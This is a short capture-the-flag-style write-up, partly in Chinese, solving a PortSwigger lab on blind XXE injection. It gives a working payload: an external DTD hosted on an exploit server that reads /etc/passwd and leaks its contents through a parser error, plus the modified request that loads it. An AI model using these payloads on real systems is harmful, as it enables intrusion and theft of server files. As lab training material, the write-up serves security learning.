Lab: Exploiting blind XXE to retrieve data via error messages

2025-01-05
#write-up  #portswigger  #xxe-injection 

Lab description#

Solution#

  1. 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为
    POST /product/stock HTTP/2

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
  2. 尝试修改productId为a
    POST /product/stock HTTP/2

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>a</productId>
    <storeId>1</storeId>
</stockCheck>

    HTTP/2 400 Bad Request

"Invalid product ID"
  3. 服务器返回报错，但是没有将a返回
  4. 点击最上方Go to exploit server，构建以下Body并点击最下方的Store
    <!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
  5. 修改步骤2的请求，并新增<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>在请求体中，发送请求即可解题
    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://exploit-0a79004704633ad283a822e901fa005e.exploit-server.net/exploit"> %xxe;]>
<stockCheck>
    <productId>a</productId>
    <storeId>1</storeId>
</stockCheck>

    HTTP/2 400 Bad Request

"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
